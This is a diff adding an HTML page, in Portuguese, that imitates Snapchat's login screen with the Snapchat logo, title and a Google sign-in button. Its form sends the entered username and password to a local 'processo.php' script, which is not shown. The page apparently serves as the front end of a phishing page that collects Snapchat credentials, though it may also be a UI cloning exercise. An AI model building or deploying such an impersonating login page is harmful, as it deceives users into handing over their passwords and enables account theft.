@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Snapchat - Faça login</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="snapchat-logo.png" alt="Logo Snapchat" />
+        </div>
+        <h2>Faça login no Snapchat</h2>
+        <form action="processo.php" method="POST">
+            <label for="username">Nome de usuário ou e-mail</label>
+            <input type="text" id="username" name="username" placeholder="exemplo@email.com" required />
+
+            <label for="senha">Senha</label>
+            <input type="password" id="senha" name="senha" placeholder="••••••••" required />
+            <span class="toggle-password" onclick="togglePassword()">👁️</span>
+
+            <a href="#" class="use-phone">Usar número de telefone</a>
+
+            <button type="submit" class="next-button">Avançar</button>
+
+            <div class="or-divider">
+                <span>OU</span>
+            </div>
+
+            <button type="button" class="google-button">
+                <img src="google-icon2.png" alt="Google Logo" /> Continuar com o Google
+            </button>
+        </form>
+
+        <p class="register-link">
+            Chegando agora no Snapchat? <a href="#">Criar conta</a>
+        </p>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const senhaInput = document.getElementById("senha");
+            if (senhaInput.type === "password") {
+                senhaInput.type = "text";
+            } else {
+                senhaInput.type = "password";
+            }
+        }
+    </script>
+</body>
+</html>
